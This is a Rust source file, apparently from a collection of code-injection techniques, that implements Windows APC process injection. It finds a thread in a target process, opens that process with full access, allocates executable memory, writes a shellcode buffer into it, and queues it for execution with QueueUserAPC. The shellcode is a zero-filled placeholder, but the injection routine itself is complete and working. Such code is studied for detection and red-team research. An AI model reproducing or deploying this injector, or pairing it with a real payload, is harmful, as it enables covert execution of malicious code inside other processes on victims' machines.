use std::{
    env::args,
    mem::{size_of, transmute},
};
use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE, PAPCFUNC},
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
                    Thread32Next,
                },
            },
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            Threading::{
                OpenProcess, OpenThread, PROCESS_ALL_ACCESS, QueueUserAPC, THREAD_ALL_ACCESS,
            },
        },
    },
    core::{Error, HRESULT, Result},
};

struct HandleGuard(HANDLE);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.is_invalid() {
                let _ = CloseHandle(self.0);
            }
        }
    }
}

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    let pid: u32 = match args().nth(1) {
        Some(arg) => arg
            .parse()
            .map_err(|_| Error::new(HRESULT(0), "Invalid PID argument"))?,
        None => {
            eprintln!("Usage: ./injectum_async_procedure_calls.exe <PID>");
            return Ok(());
        }
    };

    let h_snapshot = HandleGuard(unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)? });

    let mut t_entry = THREADENTRY32 {
        dwSize: size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    unsafe { Thread32First(h_snapshot.0, &mut t_entry)? }

    let mut thread_id = 0u32;

    loop {
        if t_entry.th32OwnerProcessID == pid {
            thread_id = t_entry.th32ThreadID;
            break;
        }

        t_entry.dwSize = size_of::<THREADENTRY32>() as u32;

        if unsafe { Thread32Next(h_snapshot.0, &mut t_entry) }.is_err() {
            break;
        }
    }

    if thread_id == 0 {
        return Ok(());
    }

    let h_process = HandleGuard(unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? });

    let h_memory = unsafe {
        VirtualAllocEx(
            h_process.0,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if h_memory.is_null() {
        return Ok(());
    }

    let mut bytes_written = 0usize;

    unsafe {
        WriteProcessMemory(
            h_process.0,
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?
    }

    let h_thread = HandleGuard(unsafe { OpenThread(THREAD_ALL_ACCESS, false, thread_id)? });

    let papc_func: PAPCFUNC = unsafe { transmute(h_memory) };

    if unsafe { QueueUserAPC(papc_func, h_thread.0, 0) } == 0 {
        return Ok(());
    }

    Ok(())
}
